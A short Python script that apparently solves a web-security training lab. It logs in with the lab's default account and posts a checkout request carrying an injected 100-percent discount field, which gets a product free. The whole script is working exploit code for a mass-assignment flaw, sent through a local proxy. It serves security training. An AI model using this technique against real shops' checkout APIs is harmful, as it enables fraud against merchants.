import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies_setting = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf(session,base_url,username):
    response = session.get(base_url,verify=False,proxies=proxies_setting)
    soup = BeautifulSoup(response.text,'html.parser')
    csrf = soup.find('input',{'name': 'csrf'})['value']
    print(f"(+) Token del usuario {username}: {csrf}")
    return csrf

def login_user(session,base_url,username,password):
    url_login = f"{base_url}/login"
    csrf = get_csrf(session,url_login,username)
    credential = {
        'csrf': csrf,
        'username': username,
        'password': password
    }
    response = session.post(url_login,data=credential,verify=False,proxies=proxies_setting)
    if "Your username is: wiener" in response.text:
        print(f"(+) Inicio de sesion con el ususrio {username} OK!")
        return True
    else:
        print(f"(-) Inicios de sesion fallido")
        return False

def place_order(session,base_url):
    url_chekout = f"{base_url}/api/checkout"
    params = {
        "chosen_discount":
            {"percentage":100},
            "chosen_products":[
                {"product_id":"1","quantity":1}]
              }
    
    response = session.post(url_chekout,json=params,verify=False,proxies=proxies_setting)

    response = session.get(base_url,verify=False,proxies=proxies_setting)
    if "Congratulations, you solved the lab!" in response.text:
        print("(+) You solved lab!")
    else:
        print("(-) Try harder.")

def main():
    if len(sys.argv) != 2:
        print(f"(+) Uso: {sys.argv[0]} www.ejemplo.com")
        exit(-1)
    
    session = requests.session()
    base_url = sys.argv[1]
    username = "wiener"
    password = "peter"
    
    print("(+) Intentando inicar sesion...")
    if login_user(session,base_url,username,password):
        print("(+) Realizando pedido...")
        place_order(session,base_url)

if __name__ == "__main__":
    main()
        
